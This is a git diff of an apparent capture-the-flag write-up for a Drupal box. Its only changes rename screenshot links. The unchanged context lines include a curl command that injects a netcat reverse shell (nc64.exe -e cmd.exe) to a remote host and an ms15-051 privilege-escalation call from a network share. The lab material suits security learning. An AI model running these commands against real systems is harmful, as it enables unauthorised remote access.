@@ -20,7 +20,7 @@ PORT      STATE SERVICE
 
 Port 80 was a Drupal Instance:
 
-![](<../../../.gitbook/assets/image%20(2139).png>)
+![](../../../.gitbook/assets/bastard-2.png)
 
 This box is really old, the intended exploit is to use Drupal Module RCE. Here's the PoC:
 
@@ -66,7 +66,7 @@ We now have RCE, and getting a reverse shell can be done through `nc.exe`.
 $ curl -G --data-urlencode 'cmd=\\10.10.14.2\share\nc64.exe -e cmd.exe 10.10.14.2 4444' 'http://10.129.84.254/test.php'
 ```
 
-![](<../../../.gitbook/assets/image%20(2620).png>)
+![](../../../.gitbook/assets/bastard-3.png)
 
 Grab the user flag.
 
@@ -153,6 +153,6 @@ C:\Windows\Tasks>\\10.10.14.2\share\ms15-051x64.exe "\\10.10.14.2\share\nc64.exe
 [!] process with pid: 2400 created.
 ```
 
-![](<../../../.gitbook/assets/image%20(1696).png>)
+![](../../../.gitbook/assets/bastard-1.png)
 
 Rooted!
